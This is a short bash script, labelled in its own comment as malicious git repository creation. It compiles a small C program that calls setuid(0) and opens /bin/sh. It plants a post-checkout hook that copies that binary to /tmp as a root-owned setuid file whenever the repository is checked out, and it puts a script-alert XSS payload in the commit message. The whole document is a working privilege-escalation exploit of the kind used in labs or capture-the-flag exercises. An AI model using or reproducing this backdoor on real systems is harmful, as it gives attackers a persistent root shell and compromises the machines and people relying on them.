#!/bin/bash
#malicious git repo creation - highjack
GITFOLDER=/root/secret-project
REMOTEFOLDER=/mnt/secret-project

echo [+] Creating $GITFOLDER/.GIT/hooks
rm -r $GITFOLDER 2>/dev/null
HOOKSPATH=$GITFOLDER/.GIT/hooks
mkdir -p $HOOKSPATH


echo [+] Initializing git 
cd $GITFOLDER
git init 1>/dev/null
cd $HOOKSPATH

echo [+] Writing backdoor
cat <<EOT >> $GITFOLDER/rs.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
   setuid( 0 );
   system( "/bin/sh" );
   return 0;
}
EOT
echo [+] Compiling backdoor
gcc  $GITFOLDER/rs.c -o $GITFOLDER/rs -m64


echo [+] Creating malicious hook
cat <<EOT >> $HOOKSPATH/post-checkout
#!/bin/bash
cp $REMOTEFOLDER/rs /tmp/rs
chown root:root /tmp/rs
chmod 4755 /tmp/rs
echo [+] check for your shell
EOT

echo [+] Commiting Changes
cd $GITFOLDER
git add .
git commit -m '<script>alert(1);</script>' 1>/dev/null

echo [+] Done

